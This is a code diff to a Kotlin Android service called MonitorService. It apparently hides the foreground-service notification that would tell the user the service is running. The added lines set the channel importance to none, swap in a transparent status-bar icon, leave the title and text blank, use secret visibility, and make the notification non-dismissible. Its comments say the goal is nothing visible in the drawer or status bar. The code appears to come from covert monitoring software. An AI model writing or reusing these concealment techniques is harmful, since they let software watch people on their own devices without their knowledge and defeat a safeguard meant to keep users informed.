@@ -46,7 +46,7 @@ class MonitorService : LifecycleService() {
             private set
 
         private const val TAG        = "MonitorService"
-        private const val CHANNEL_ID  = "mon_svc"   // New ID — forces fresh channel creation
+        private const val CHANNEL_ID  = "mon_svc_v2" // Bumped — forces fresh silent channel
         private const val NOTIF_ID    = 1
         const val ACTION_START = "ACTION_START_MONITOR"
         const val EXTRA_RESULT_CODE = "result_code"
@@ -157,7 +157,7 @@ class MonitorService : LifecycleService() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(
                 CHANNEL_ID, "System",
-                NotificationManager.IMPORTANCE_MIN  // Lowest safe level: no icon, no sound
+                NotificationManager.IMPORTANCE_NONE  // Hidden: no drawer entry, no status bar icon
             ).apply {
                 setShowBadge(false)
                 setSound(null, null)
@@ -177,11 +177,11 @@ class MonitorService : LifecycleService() {
             Notification.Builder(this)
         }
         return builder
-            .setSmallIcon(android.R.drawable.ic_menu_manage)
-            .setContentTitle("")          // blank — nothing to read
+            .setSmallIcon(R.drawable.ic_transparent) // Transparent icon — nothing shown in status bar
+            .setContentTitle("")                     // Blank — nothing readable
             .setContentText("")
             .setVisibility(Notification.VISIBILITY_SECRET)
-            .setOngoing(true)             // non-dismissible, service stays alive
             .build()
+            .also { it.flags = it.flags or Notification.FLAG_NO_CLEAR } // Non-dismissible without setOngoing
     }
 }
